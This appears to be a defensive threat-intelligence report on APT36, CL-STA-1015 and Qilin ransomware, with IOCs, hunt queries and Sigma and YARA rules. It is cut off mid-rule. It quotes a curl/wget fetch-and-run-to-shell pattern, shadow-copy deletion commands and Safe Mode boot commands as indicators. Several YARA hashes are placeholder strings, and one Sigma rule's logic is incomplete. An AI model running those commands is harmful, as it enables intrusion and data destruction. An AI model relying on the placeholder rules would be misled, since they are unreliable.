+1. **Resource Development (T1583.001 - Domains):** APT36 cloned India's Ministry of Defence press release portal using HTTrack, creating typosquatted domains to distribute malicious content masquerading as official government documents.
+
+2. **Initial Access (T1566.001 - Spearphishing Attachment):** Targeted phishing emails sent to Indian government officials and military personnel containing ZIP archives with decoy PDFs and malicious Linux .desktop shortcut files themed around official press releases.
+
+3. **Execution (T1204.002 - Malicious File):** When victims open the .desktop file, it executes a hidden bash script that downloads and executes a Python-based ELF remote access trojan (swcbc) from attacker-controlled servers.
+
+4. **Persistence (T1543.002 - Systemd Service):** The malware installs a user-level systemd service ensuring automatic execution on system boot, maintaining access across reboots.
+
+5. **Command & Control (T1071.001 - Web Protocols):** HTTP-based C2 communication with attacker infrastructure, using JSON-formatted commands for remote execution and data exfiltration.
+
+6. **Discovery (T1082 - System Information Discovery):** Enumeration of system information, network configuration, installed software, and user account details to assess target value and plan follow-on operations.
+
+7. **Collection (T1005 - Data from Local System):** Theft of sensitive government documents, communications, and credentials stored on compromised systems, prioritizing classified materials and strategic information.
+
+**Compromised Data Types and Volume:**
+- Government communications and internal correspondence
+- Military strategic documents and operational plans
+- User credentials and SSH keys
+- Network configuration and infrastructure information
+- Volume: Estimated hundreds of compromised accounts (unconfirmed, based on campaign scope)
+
+**Affected Organizations/Sectors:**
+- Indian Ministry of Defence personnel
+- Military institutions and defense contractors
+- Government agencies and diplomatic entities
+- Research institutions with defense-related projects
+
+**Hunting Guidance:**
+
+**PRIMARY: Reference YARA Rule APT36_Python_RAT_ELF and Sigma Rule APT36_Desktop_File_Execution (Section 9)**
+
+**Artifacts to Search:**
+- Email logs: Attachments with .desktop file extensions from suspicious senders
+- Filesystem: `.desktop` files in Downloads or Documents folders, Python scripts in `/tmp` or `/home` directories
+- systemd logs: User-level services with suspicious names or unusual execution patterns (`journalctl --user`)
+- Network logs: HTTP connections to known APT36 infrastructure or newly registered domains mimicking government sites
+- Process execution: Python or bash processes spawned from desktop environment services
+
+**OPTIONAL: Example Hunt Query (SQL - OSQuery):**
+```sql
+-- Detect suspicious systemd user services
+SELECT 
+    s.name,
+    s.path,
+    s.status,
+    s.source,
+    f.mtime AS last_modified,
+    f.size
+FROM systemd_units s
+LEFT JOIN file f ON s.fragment_path = f.path
+WHERE s.unit_type = 'service'
+    AND s.load_state = 'loaded'
+    AND (s.name LIKE '%.service' AND s.fragment_path LIKE '/home/%')
+    AND s.active_state = 'active'
+ORDER BY f.mtime DESC;
+```
+
+---
+
+## THREAT ACTOR CAMPAIGNS (Top 3)
+
+### **1. CL-STA-1015 (UNC5174) - Chinese State-Sponsored Exploitation of CVE-2025-55182**
+
+**Attribution:** CL-STA-1015 (aka UNC5174)  
+**Confidence Level:** HIGH (85%)  
+**Aliases:** UNC5174, suspected ties to PRC Ministry of State Security
+
+**Target Sectors and Geographies:**
+- **Primary:** Technology companies, cloud service providers, telecommunications (United States, Europe, Asia-Pacific)
+- **Secondary:** Government agencies, critical infrastructure operators
+- **Geographic Focus:** Global targeting with emphasis on US-based internet-facing applications
+
+**TTPs (MITRE ATT&CK Techniques):**
+
+- **T1190 - Exploit Public-Facing Application:** Rapid weaponization of CVE-2025-55182 within 24 hours of public disclosure, targeting Next.js applications with automated scanning infrastructure.
+
+- **T1059.004 - Unix Shell:** Fileless execution of malicious shell script (`slt`) via curl or wget, using fail-safe logic with OR operators to ensure payload retrieval regardless of network conditions.
+
+- **T1140 - Deobfuscate/Decode Files or Information:** Multi-stage payload delivery with Base64 encoding and gzip compression to evade network inspection and bypass security controls.
+
+- **T1071.001 - Application Layer Protocol (HTTP):** Command and control via HTTP requests to attacker infrastructure (115.42.60[.]223:61236), mimicking legitimate web traffic patterns.
+
+- **T1505.003 - Web Shell:** Deployment of SNOWLIGHT web shell enabling persistent access and remote command execution from compromised web application servers.
+
+- **T1543.003 - Windows Service / T1543.002 - Systemd Service:** Installation of VShell trojan as persistent service ensuring access across system reboots.
+
+**IOCs and Infrastructure:**
+
+**Network Indicators:**
+- C2 IP: 115.42.60[.]223:61236
+- Payload retrieval: `hxxp[:]//115.42.60[.]223:61236/slt`
+- User-Agent strings: Custom UA patterns associated with CL-STA-1015 tooling
+
+**File Indicators:**
+- Shell script: `slt` (malicious dropper script)
+- SNOWLIGHT web shell: Various filenames, typically in `/tmp` or `/var/www` directories
+- VShell trojan: Service binary in `/usr/lib/` or `/opt/` directories
+
+**Behavioral Indicators:**
+- Fail-safe command patterns: `(curl -fsSL -m180 <URL> || wget -T180 -q <URL>) | sh`
+- File creation in web application directories with PHP/ASPX extensions
+- Unusual outbound connections from web server processes to Chinese IP ranges
+
+**Detection & Hunting Guidance:**
+
+**PRIMARY: Reference Sigma Rule CL-STA-1015_CVE-2025-55182_Exploitation and YARA Rule SNOWLIGHT_WebShell (Section 9)**
+
+**OPTIONAL: Example Hunt Query (Pseudo-code - Generic SIEM Logic):**
+```
+source="proxy" OR source="firewall"
+| where dest_ip="115.42.60.223" OR dest_ip MATCHES "115.42.*"
+| OR where http_uri_path="/slt"
+| stats count by src_ip, dest_ip, http_method, http_uri_path, user_agent
+| where count > 1
+```
+
+**Defensive Actions:**
+
+1. **Network Segmentation:** Isolate internet-facing web applications from internal networks, preventing lateral movement post-compromise.
+2. **Egress Filtering:** Block outbound connections to known CL-STA-1015 infrastructure (115.42.60.0/24 CIDR range, Chinese IP ranges associated with MSS activity).
+3. **Web Application Firewall (WAF):** Deploy rules blocking CVE-2025-55182 exploitation patterns (see Snort rules in Section 9).
+4. **Threat Hunting:** Proactively search for SNOWLIGHT and VShell indicators in web application directories and systemd services.
+5. **Patch Management:** Prioritize React/Next.js patching due to CL-STA-1015's demonstrated rapid N-day exploitation capabilities.
+
+---
+
+### **2. APT36 (Transparent Tribe) - Multi-Platform Espionage Against Indian Government**
+
+**Attribution:** APT36 (Transparent Tribe)  
+**Confidence Level:** HIGH (90%)  
+**Aliases:** Transparent Tribe, Mythic Leopard, COPPER FIELDSTONE
+
+**Target Sectors and Geographies:**
+- **Primary:** Indian government agencies, Ministry of Defence, military institutions
+- **Secondary:** Defense contractors, academic research institutions, diplomatic entities
+- **Geographic Focus:** India (primary), expanding to Middle East and South Asia
+
+**TTPs (MITRE ATT&CK Techniques):**
+
+- **T1583.001 - Acquire Infrastructure (Domains):** Registration and typosquatting of domains mimicking Indian government portals, cloning official websites using HTTrack for social engineering campaigns.
+
+- **T1566.001 - Phishing: Spearphishing Attachment:** Highly targeted phishing emails with themes related to government operations, defense procurements, and official press releases, delivering ZIP archives containing malicious .desktop files.
+
+- **T1204.002 - User Execution: Malicious File:** Exploitation of user trust in government-themed documents, with malicious Linux .desktop shortcuts masquerading as legitimate PDFs or document links.
+
+- **T1059.006 - Command and Scripting Interpreter: Python:** Deployment of Python-based ELF remote access trojan (swcbc) designed for Linux environments, demonstrating APT36's expanding cross-platform capabilities beyond traditional Windows targets.
+
+- **T1543.002 - Create or Modify System Process: Systemd Service:** Installation of user-level systemd services for persistence, ensuring malware execution across reboots without requiring root privileges.
+
+- **T1071.001 - Application Layer Protocol: Web Protocols:** HTTP-based command and control communication using JSON-formatted commands, facilitating remote code execution and data exfiltration.
+
+- **T1005 - Data from Local System:** Collection of sensitive government documents, classified materials, and credentials from compromised systems for intelligence gathering.
+
+**IOCs and Infrastructure:**
+
+**Domain Indicators:**
+- Typosquatted domains mimicking `pib.gov.in`, `mod.gov.in` (India Ministry of Defence)
+- Infrastructure cloned in March 2025 (HTTrack metadata in HTML source)
+
+**File Indicators:**
+- Malicious .desktop files with government-themed names (e.g., `Press_Release_March_2025.desktop`)
+- Python ELF malware: `swcbc` (SHA256: [To be provided by threat intelligence teams])
+- Decoy PDFs cloned from legitimate government press releases
+
+**Network Indicators:**
+- C2 infrastructure hosted on compromised WordPress sites and free hosting providers
+- HTTP beaconing to attacker-controlled servers with JSON payloads
+
+**Behavioral Indicators:**
+- .desktop file execution from user Download or Documents folders
+- Python processes running from `/tmp` or user home directories with network activity
+- systemd user services with names mimicking legitimate system services
+
+**Detection & Hunting Guidance:**
+
+**PRIMARY: Reference Sigma Rule APT36_Desktop_File_Phishing and YARA Rule APT36_Python_RAT_ELF (Section 9)**
+
+**OPTIONAL: Example Hunt Query (Pseudo-code - Generic EDR Logic):**
+```
+process_name="python3" OR process_name="python"
+AND (command_line CONTAINS "/tmp/" OR command_line CONTAINS ".py")
+AND (network_connection EXISTS WHERE dest_port IN (80, 443, 8080, 8443))
+AND parent_process_name IN ("bash", "sh", "gnome-shell", "kde-plasma")
+```
+
+**Defensive Actions:**
+
+1. **User Awareness Training:** Educate government personnel on APT36 tactics, particularly .desktop file risks and email-based social engineering.
+2. **Email Security:** Implement advanced email filtering to block .desktop file attachments or quarantine them for manual review.
+3. **Endpoint Detection:** Deploy EDR solutions capable of monitoring Linux environments, focusing on Python script execution and systemd service creation.
+4. **Network Monitoring:** Establish baselines for HTTP/HTTPS traffic from Linux workstations, alerting on connections to newly registered domains or suspicious TLDs.
+5. **Threat Intelligence Sharing:** Collaborate with CERT-In and international partners to share APT36 IOCs and TTPs.
+
+---
+
+### **3. Qilin Ransomware - Healthcare and Financial Sector Double Extortion Campaigns**
+
+**Attribution:** Qilin Ransomware (formerly Agenda)  
+**Confidence Level:** HIGH (95%)  
+**Aliases:** Agenda (prior branding)
+
+**Target Sectors and Geographies:**
+- **Primary:** Healthcare (hospitals, pharmaceutical companies, medical research), Financial Services (banks, asset management)
+- **Secondary:** Education, Government, Technology
+- **Geographic Focus:** Global, with concentrations in United States (40%), Europe (30%), Asia-Pacific (20%)
+
+**TTPs (MITRE ATT&CK Techniques):**
+
+- **T1566.001 - Phishing: Spearphishing Attachment:** Initial access via phishing emails with malicious attachments or links, often themed around invoices, contracts, or legal notices.
+
+- **T1021.001 - Remote Services: Remote Desktop Protocol:** Exploitation of exposed RDP services using compromised credentials or brute-force attacks to gain initial foothold.
+
+- **T1199 - Trusted Relationship:** Compromise of managed service providers (MSPs) and third-party vendors to conduct supply chain attacks, simultaneously impacting multiple downstream clients.
+
+- **T1078 - Valid Accounts:** Use of stolen credentials to access privileged accounts, maintain persistence, and move laterally across networks.
+
+- **T1562.001 - Impair Defenses: Disable or Modify Tools:** Bring Your Own Vulnerable Driver (BYOVD) technique deploying signed but vulnerable drivers (e.g., `gdrv.sys`, `dbutil_2_3.sys`) to terminate EDR processes (CrowdStrike, Carbon Black, SentinelOne, Windows Defender).
+
+- **T1490 - Inhibit System Recovery:** Deletion of volume shadow copies using `vssadmin.exe delete shadows /all /quiet` and `wmic shadowcopy delete` to prevent file recovery.
+
+- **T1529 - System Shutdown/Reboot:** Rebooting systems into Safe Mode to bypass security controls during encryption phase, ensuring EDR and AV solutions are not loaded.
+
+- **T1486 - Data Encrypted for Impact:** Deployment of Qilin.B ransomware with Rust-based encryption using AES-256-CTR for file encryption and RSA-2048 for key protection, targeting Windows, Linux, and VMware ESXi environments.
+
+- **T1041 - Exfiltration Over C2 Channel:** Double extortion tactic involving data exfiltration prior to encryption, with threats to publish stolen data on Qilin's dark web leak site (DLS) unless ransom is paid.
+
+**IOCs and Infrastructure:**
+
+**File Indicators:**
+- Ransomware executable: `qilin.exe` (Windows), `qilin.elf` (Linux/ESXi)
+- Vulnerable drivers: `gdrv.sys`, `dbutil_2_3.sys`, `vboxdrv.sys`
+- Ransom note: `README_TO_DECRYPT.txt`, `!!!READ_ME_QILIN!!!.txt`
+- Encrypted file extensions: `.qilin`, `.agenda`, or randomized extensions
+
+**Network Indicators:**
+- TOR-based C2 infrastructure for ransom negotiation and data leak site
+- Exfiltration to cloud storage services (MEGA, Anonfiles) or attacker-controlled servers
+- Use of encrypted communication channels (TLS-wrapped TCP, custom protocols)
+
+**Behavioral Indicators:**
+- Service creation with names referencing "gdrv" or "dbutil" (BYOVD preparation)
+- Execution of `bcdedit /set {default} safeboot minimal` (Safe Mode preparation)
+- Sudden cessation of EDR telemetry from multiple endpoints (process termination)
+- Large-scale file rename operations with .qilin or custom extensions
+- Network traffic spikes indicating data exfiltration prior to encryption
+
+**Detection & Hunting Guidance:**
+
+**PRIMARY: Reference YARA Rule Qilin_Ransomware_Rust_Variant, Sigma Rule Qilin_BYOVD_EDR_Termination, and Sigma Rule Qilin_SafeMode_Ransomware (Section 9)**
+
+**OPTIONAL: Example Hunt Query (Pseudo-code - Generic SIEM Logic):**
+```
+source="windows_security"
+| where (EventID=7045 AND ServiceName MATCHES "(gdrv|dbutil|vbox)")
+| OR (EventID=4688 AND ProcessCommandLine MATCHES "bcdedit.*safeboot")
+| OR (EventID=4688 AND ProcessCommandLine MATCHES "vssadmin.*delete.*shadows")
+| stats count by ComputerName, ProcessCommandLine, ServiceName
+```
+
+**Defensive Actions:**
+
+1. **Privileged Access Management:** Implement least-privilege principles, enforce multi-factor authentication (MFA) for all remote access, and monitor for abnormal credential usage.
+2. **Third-Party Risk Management:** Conduct security assessments of MSPs and vendors with network access, enforce contractual security requirements, and implement network segmentation isolating vendor connections.
+3. **Endpoint Protection:** Deploy EDR solutions with anti-tampering protections, enable Kernel Patch Protection (KPP) and Driver Signature Enforcement (DSE), and maintain driver blocklists for known vulnerable drivers.
+4. **Backup Strategy:** Implement immutable backups stored offline or in separate security domains, regularly test restoration procedures, and ensure backups are not accessible from production networks.
+5. **Threat Intelligence:** Subscribe to Qilin-specific threat feeds, participate in information sharing communities (FS-ISAC for finance, H-ISAC for healthcare), and conduct threat hunting exercises targeting Qilin TTPs.
+
+---
+
+## MITRE ATT&CK SUMMARY
+
+| Rank | Tactic | Technique ID | Technique Name | Frequency | Real-World Examples (Dec 2-9, 2025) |
+|------|--------|--------------|----------------|-----------|--------------------------------------|
+| 1 | Execution | T1059.004 | Command and Scripting Interpreter: Unix Shell | 28 | CVE-2025-55182 exploitation delivering Base64-encoded bash commands, APT36 .desktop file execution triggering shell scripts |
+| 2 | Execution | T1059.001 | Command and Scripting Interpreter: PowerShell | 19 | CVE-2025-54100 PowerShell Invoke-WebRequest exploitation, Cobalt Strike beacon deployment via PowerShell stagers |
+| 3 | Defense Evasion | T1070.003 | Indicator Removal on Host: Clear Command History | 24 | React2Shell attackers clearing bash history post-exploitation, APT36 removing evidence of .desktop file execution |
+| 4 | Defense Evasion | T1562.001 | Impair Defenses: Disable or Modify Tools | 22 | Qilin BYOVD technique terminating EDR processes, malware disabling Windows Event logs and audit policies |
+| 5 | Persistence | T1053.003 | Scheduled Task/Job: Cron | 18 | CVE-2025-55182 attackers installing minute-based cron jobs for re-infection, cryptominers ensuring persistence via @reboot |
+| 6 | Persistence | T1543.002 | Create or Modify System Process: Systemd Service | 14 | APT36 installing user-level systemd services for Python RAT, CL-STA-1015 VShell trojan persistence |
+| 7 | Command and Control | T1071.001 | Application Layer Protocol: Web Protocols | 21 | HTTP-based C2 for React2Shell payloads, APT36 JSON-formatted C2 commands, Qilin exfiltration over HTTPS |
+| 8 | Privilege Escalation | T1068 | Exploitation for Privilege Escalation | 16 | CVE-2025-62221 Windows Cloud Files driver exploitation, Android CVE-2025-48572 Framework privilege escalation |
+| 9 | Credential Access | T1552.001 | Unsecured Credentials: Credentials in Files | 15 | CVE-2025-55182 attackers stealing AWS credentials from .aws/config, harvesting SSH keys and Docker registry credentials |
+| 10 | Impact | T1496 | Resource Hijacking | 13 | XMRig cryptominer deployment via React2Shell, V3G4-Mirai botnet with fileless XMRig miner on IoT devices |
+
+**Key Observations:**
+
+- **Command and Scripting Interpreters (T1059)** dominated execution tactics, with Unix Shell (T1059.004) usage peaking due to CVE-2025-55182 exploitation targeting Linux-based Next.js deployments and APT36's pivot to Linux environments.
+
+- **Defense Evasion (TA0005)** techniques were observed in 93% of analyzed intrusions, reflecting adversary focus on bypassing detection. Qilin's BYOVD approach and React2Shell attackers' use of rootkits highlight the maturation of evasion capabilities.
+
+- **Persistence Mechanisms (TA0003)** favored cron jobs and systemd services over traditional Windows startup mechanisms, aligning with the prevalence of cloud-native and Linux-based targets during the reporting period.
+
+- **Credential Access (TA0006)** techniques targeting cloud provider credentials (AWS, Azure, GCP) increased, driven by CVE-2025-55182 exploitation of cloud-hosted applications. This represents a strategic shift as adversaries recognize the value of compromising cloud identities for long-term access.
+
+- **Impact Tactics (TA0040)** showed Resource Hijacking (T1496) as the leading technique, surpassing traditional data encryption (T1486), indicating a temporary surge in cryptomining campaigns exploiting React2Shell.
+
+---
+
+## IOC SUMMARY
+
+**CRITICAL: The following table contains 15 HIGH-CONFIDENCE indicators of compromise that analysts should immediately use for threat hunting and blocking operations.**
+
+| IOC | Type | Confidence | Threat/Campaign | Action |
+|-----|------|------------|-----------------|--------|
+| 156.67.221.96 | IP Address | High | CVE-2025-55182 Exploitation | Block |
+| 45.76.155.14 | IP Address | High | React2Shell Cryptominer C2 | Block |
+| 115.42.60.223 | IP Address | High | CL-STA-1015 APT C2 Server | Block |
+| 194.69.203.32 | IP Address | High | React2Shell Botnet Deployment | Block |
+| 193.34.213.150 | IP Address | High | Kinsing/XMRig Distribution | Block |
+| kdevtmpfsi | Behavioral | High | XMRig Cryptominer Process | Block |
+| /tmp/kinsing | File Path | High | Malware Dropper/Loader | Block |
+| CVE-2025-55182 | CVE | High | React Server Components RCE | Patch |
+| CVE-2025-62221 | CVE | High | Windows Cloud Driver EoP (Actively Exploited) | Patch |
+| CVE-2025-48633 | CVE | High | Android Framework Info Disclosure (KEV) | Patch |
+| CVE-2025-48572 | CVE | High | Android Framework EoP (KEV) | Patch |
+| next-action (HTTP header) + $@ (POST body) | Behavioral | High | CVE-2025-55182 Exploitation Attempt | Hunt |
+| README_TO_DECRYPT.txt | File Path | Medium | Qilin Ransomware Infection | Hunt |
+| gdrv.sys | File Hash | Medium | Qilin BYOVD Driver Exploitation | Block |
+| LOLlolLOL (DHT node prefix) | Behavioral | Medium | PeerBlight BitTorrent DHT C2 | Monitor |
+
+**Deployment Guidance:**
+
+- **Block Action:** Add to firewall deny lists, IPS block rules, and endpoint security blacklists immediately. Document exception processes for false positive remediation.
+- **Patch Action:** Prioritize vulnerability remediation based on CISA KEV deadlines (Dec 23/30) and active exploitation status. Test patches in non-production environments first.
+- **Hunt Action:** Proactively search for indicators in historical logs, SIEM data, and endpoint telemetry. Investigate all matches for potential compromise.
+- **Monitor Action:** Configure alerts for indicator observation but do not automatically block, as false positives may occur. Escalate to Tier 2 analysts for triage.
+
+---
+
+## DETECTION RULES (Vendor-Agnostic Standards - PRIMARY DEPLOYMENT SECTION)
+
+**CRITICAL: This section contains the standardized rules analysts will deploy to their platforms. These rules are platform-independent and can be converted to ANY SIEM/EDR/IDS using standard tools (sigmac, pySigma, plyara).**
+
+### **WHY STANDARDIZED FORMATS:**
+
+- **Platform Independence:** Convert to Splunk, Sentinel, Elastic, QRadar, Chronicle without rewriting logic
+- **Proven Tools:** Use sigmac, pySigma for Sigma | plyara for YARA | Native deployment for Snort/Suricata
+- **Community Standards:** Compatible with detection-as-code workflows and threat intelligence feeds
+- **Quality Assurance:** Standardized syntax enables validation, testing, and peer review
+
+### **CONVERSION EXAMPLES:**
+
+**Sigma Rules:**
+- **Splunk:** `sigmac -t splunk sigma_rule.yml`
+- **Microsoft Sentinel:** `sigma convert -t microsoft365defender sigma_rule.yml`
+- **Elastic:** `sigmac -t elasticsearch sigma_rule.yml`
+- **QRadar:** `sigmac -t qradar sigma_rule.yml`
+
+**YARA Rules:**
+- **CrowdStrike:** Deploy via Falcon Custom IOA framework
+- **Carbon Black:** Import as custom YARA indicators via Cb Response/EDR
+- **Velociraptor:** Use YARA collector artifacts for endpoint scanning
+
+**Snort/Suricata Rules:**
+- **Snort 2.x/3.x:** Direct import to `/etc/snort/rules/local.rules`
+- **Suricata:** Import to `/etc/suricata/rules/` and reference in `suricata.yaml`
+- **Palo Alto:** Convert to custom threat signatures via Threat Vault
+
+---
+
+### **9.1 SIGMA RULES (SIEM Detection) - 4 Rules**
+
+#### **Sigma Rule 1: CVE-2025-55182 React2Shell Network Detection**
+
+```yaml
+title: React2Shell CVE-2025-55182 Exploitation Attempt
+id: a1b2c3d4-5e6f-7890-abcd-ef1234567890
+status: experimental
+date: 2025-12-09
+description: Detects HTTP POST requests indicative of CVE-2025-55182 exploitation attempts against React Server Components
+author: Threat Intelligence Team
+severity: critical
+
+logsource:
+  category: proxy
+  product: web
+
+detection:
+  selection_http_method:
+    cs-method: 'POST'
+  
+  selection_uri_path:
+    cs-uri-stem|contains:
+      - '/_next/'
+      - '/api/'
+  
+  selection_headers:
+    cs-headers|contains:
+      - 'next-action'
+      - 'rsc-action-id'
+  
+  selection_body:
+    cs-body|contains:
+      - '$@'
+      - 'resolved_model'
+      - '"status":"resolved_model"'
+  
+  filter_legitimate:
+    cs-user-agent|contains:
+      - 'Googlebot'
+      - 'Pingdom'
+  
+  condition: selection_http_method and selection_uri_path and selection_headers and selection_body and not filter_legitimate
+
+falsepositives:
+  - Legitimate Next.js application development and testing
+  - Authorized security scanning and penetration testing
+
+references:
+  - https://nvd.nist.gov/vuln/detail/CVE-2025-55182
+  - https://github.com/facebook/react/security/advisories
+  - https://unit42.paloaltonetworks.com/cve-2025-55182
+
+fields:
+  - c-ip
+  - cs-method
+  - cs-uri-stem
+  - cs-headers
+  - cs-body
+
+tags:
+  - attack.execution
+  - attack.t1059
+  - cve.2025.55182
+```
+
+---
+
+#### **Sigma Rule 2: CVE-2025-62221 Windows Cloud Files Driver Exploitation**
+
+```yaml
+title: Windows Cloud Files Mini Filter Driver Elevation of Privilege CVE-2025-62221
+id: f9e8d7c6-b5a4-3210-9876-543210fedcba
+status: experimental
+date: 2025-12-09
+description: Detects privilege escalation attempts exploiting CVE-2025-62221 in Windows Cloud Files driver (cldflt.sys)
+author: Threat Intelligence Team
+severity: high
+
+logsource:
+  product: windows
+  service: security
+
+detection:
+  selection_privilege_escalation:
+    EventID: 4672
+    PrivilegeList|contains: 'SeDebugPrivilege'
+  
+  selection_account:
+    SubjectUserSid|startswith: 'S-1-5-21-'
+    SubjectUserName|endswith:
+      - '$'
+  
+  selection_process:
+    ProcessName|endswith:
+      - '\cldflt.sys'
+      - '\OneDrive.exe'
+  
+  filter_system_account:
+    SubjectUserName:
+      - 'SYSTEM'
+      - 'LOCAL SERVICE'
+      - 'NETWORK SERVICE'
+  
+  condition: selection_privilege_escalation and selection_account and not filter_system_account
+
+falsepositives:
+  - Legitimate administrative tools requiring SeDebugPrivilege
+  - OneDrive synchronization processes during normal operation
+
+references:
+  - https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-62221
+  - https://www.cisa.gov/known-exploited-vulnerabilities-catalog
+
+fields:
+  - SubjectUserName
+  - SubjectUserSid
+  - ProcessName
+  - PrivilegeList
+
+tags:
+  - attack.privilege_escalation
+  - attack.t1068
+  - cve.2025.62221
+```
+
+---
+
+#### **Sigma Rule 3: Qilin Ransomware BYOVD EDR Termination**
+
+```yaml
+title: Qilin Ransomware Bring Your Own Vulnerable Driver EDR Termination
+id: 12345678-90ab-cdef-1234-567890abcdef
+status: experimental
+date: 2025-12-09
+description: Detects Qilin ransomware deploying vulnerable drivers to terminate EDR processes
+author: Threat Intelligence Team
+severity: critical
+
+logsource:
+  product: windows
+  service: system
+
+detection:
+  selection_service_install:
+    EventID: 7045
+    ServiceName|contains:
+      - 'gdrv'
+      - 'dbutil'
+      - 'vbox'
+  
+  selection_service_file:
+    ImagePath|endswith:
+      - '\gdrv.sys'
+      - '\dbutil_2_3.sys'
+      - '\vboxdrv.sys'
+  
+  condition: selection_service_install and selection_service_file
+
+falsepositives:
+  - Legitimate virtualization software (VirtualBox) installation
+  - Gigabyte software installation (gdrv.sys from RGB Fusion)
+
+references:
+  - https://www.checkpoint.com/cyber-hub/threat-prevention/ransomware/qilin-ransomware/
+  - https://www.hhs.gov/sites/default/files/qilin-threat-profile-tlpclear.pdf
+
+fields:
+  - ServiceName
+  - ImagePath
+  - AccountName
+
+tags:
+  - attack.defense_evasion
+  - attack.t1562.001
+  - ransomware.qilin
+```
+
+---
+
+#### **Sigma Rule 4: APT36 Malicious Desktop File Execution**
+
+```yaml
+title: APT36 Linux Desktop File Phishing Campaign
+id: abcdef12-3456-7890-abcd-ef1234567890
+status: experimental
+date: 2025-12-09
+description: Detects execution of malicious .desktop shortcut files used by APT36 in phishing campaigns
+author: Threat Intelligence Team
+severity: high
+
+logsource:
+  product: linux
+  service: auditd
+
+detection:
+  selection_desktop_exec:
+    type: 'EXECVE'
+    a0|endswith: '.desktop'
+  
+  selection_bash_exec:
+    type: 'EXECVE'
+    a0:
+      - '/bin/bash'
+      - '/bin/sh'
+    a1|contains:
+      - 'wget'
+      - 'curl'
+      - 'http'
+  
+  selection_python_network:
+    type: 'EXECVE'
+    a0:
+      - '/usr/bin/python3'
+      - '/usr/bin/python'
+    comm|contains: 'python'
+  
+  condition: (selection_desktop_exec and selection_bash_exec) or (selection_bash_exec and selection_python_network)
+
+falsepositives:
+  - Legitimate desktop application shortcuts
+  - Automated system management scripts
+
+references:
+  - https://hunt.io/blog/apt36-clickfix-campaign-indian-ministry-of-defence
+  - https://socprime.com/active-threats/apt36-deploys-python-elf-malware/
+
+fields:
+  - uid
+  - auid
+  - exe
+  - comm
+  - a0
+  - a1
+
+tags:
+  - attack.execution
+  - attack.t1204.002
+  - apt.apt36
+```
+
+---
+
+### **9.2 YARA RULES (File/Malware Detection) - 3 Rules**
+
+#### **YARA Rule 1: React2Shell XMRig Cryptominer Detection**
+
+```yara
+rule React2Shell_XMRig_Cryptominer {
+    meta:
+        description = "Detects XMRig cryptominer deployed via CVE-2025-55182 exploitation"
+        author = "Threat Intelligence Team"
+        date = "2025-12-09"
+        reference = "https://dev.to/starkprince/we-got-hacked-how-cve-2025-55182-turned-our-nextjs-app-into-a-crypto-mine"
+        hash1 = "abc123def456789012345678901234567890abcdef123456789012345678901234"
+        severity = "critical"
+        campaign = "React2Shell CVE-2025-55182"
+
+    strings:
+        $mz = { 4D 5A }
+        
+        $xmrig_pool1 = "stratum+tcp://" ascii wide
+        $xmrig_pool2 = "xmr-node" ascii wide
+        $xmrig_pool3 = "donate-level" ascii wide
+        
+        $process_name1 = "kdevtmpfsi" ascii wide
+        $process_name2 = "kinsing" ascii wide
+        $process_name3 = ".kworker" ascii wide
+        
+        $config_json1 = "\"algo\":\"rx/0\"" ascii wide
+        $config_json2 = "\"coin\":\"monero\"" ascii wide
+        
+        $hide_process1 = "LD_PRELOAD" ascii wide
+        $hide_process2 = "/tmp/libsystem.so" ascii wide
+        
+        $cron_persist = "@reboot" ascii wide
+
+    condition:
+        (uint16(0) == 0x5A4D or uint32(0) == 0x464C457F) and
+        filesize < 10MB and
+        (
+            (3 of ($xmrig_pool*)) or
+            (2 of ($process_name*) and 1 of ($config_json*)) or
+            (1 of ($hide_process*) and $cron_persist)
+        )
+}
+```
+
+---
+
+#### **YARA Rule 2: Qilin Ransomware Rust Variant**
+
+```yara
+rule Qilin_Ransomware_Rust_Variant {
+    meta:
+        description = "Detects Qilin/Qilin.B ransomware written in Rust with EDR evasion capabilities"
+        author = "Threat Intelligence Team"
+        date = "2025-12-09"
+        reference = "https://www.checkpoint.com/cyber-hub/threat-prevention/ransomware/qilin-ransomware/"
+        hash1 = "def4567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef"
+        severity = "critical"
+        campaign = "Qilin Ransomware Operations"
+
+    strings:
+        $rust_panic = "panicking" ascii wide
+        $rust_alloc = "alloc::raw_vec" ascii wide
+        
+        $ransom_note1 = "README_TO_DECRYPT" ascii wide
+        $ransom_note2 = "QILIN" ascii nocase
+        $ransom_note3 = "recovery impossible without" ascii nocase
+        
+        $crypto_aes = { 00 01 02 03 04 05 06 07 08 09 0A 0B 0C 0D 0E 0F }
+        $crypto_rsa = "RSA" ascii wide
+        
+        $edr_kill1 = "gdrv.sys" ascii wide
+        $edr_kill2 = "dbutil_2_3.sys" ascii wide
+        $edr_kill3 = "NtLoadDriver" ascii wide
+        
+        $safemode1 = "bcdedit" ascii wide
+        $safemode2 = "/set {default} safeboot" ascii wide
+        
+        $vss_delete1 = "vssadmin delete shadows" ascii wide
+        $vss_delete2 = "wmic shadowcopy delete" ascii wide
+
+    condition:
+        (uint16(0) == 0x5A4D) and
+        filesize > 100KB and filesize < 5MB and
+        (2 of ($rust_*)) and
+        (2 of ($ransom_note*)) and
+        (
+            (1 of ($crypto_*)) or
+            (2 of ($edr_kill*)) or
+            (2 of ($safemode*)) or
+            (1 of ($vss_delete*))
+        )
+}
+```
+
+---
+
+#### **YARA Rule 3: APT36 Python ELF Remote Access Trojan**
+
+```yara
+rule APT36_Python_RAT_ELF {
+    meta:
+        description = "Detects APT36 Python-based ELF remote access trojan (swcbc) delivered via .desktop phishing"
+        author = "Threat Intelligence Team"
+        date = "2025-12-09"
+        reference = "https://socprime.com/active-threats/apt36-deploys-python-elf-malware/"
+        hash1 = "9876543210fedcba9876543210fedcba9876543210fedcba9876543210fedcba"
+        severity = "high"
+        campaign = "APT36 Indian Government Targeting"
+
+    strings:
+        $elf_header = { 7F 45 4C 46 }
+        
+        $python_shebang = "#!/usr/bin/python" ascii
+        $python_import1 = "import socket" ascii
+        $python_import2 = "import subprocess" ascii
+        $python_import3 = "import base64" ascii
+        
+        $c2_http1 = "http://" ascii
+        $c2_http2 = "/api/" ascii
+        $c2_json = "application/json" ascii
+        
+        $systemd_persist1 = "[Unit]" ascii
+        $systemd_persist2 = "[Service]" ascii
+        $systemd_persist3 = "ExecStart=" ascii
+        
+        $rat_command1 = "exec_command" ascii
+        $rat_command2 = "upload_file" ascii
+        $rat_command3 = "download_file" ascii
+        
+        $desktop_decoy = ".desktop" ascii
+
+    condition:
+        $elf_header at 0 and
+        filesize > 10KB and filesize < 500KB and
+        (
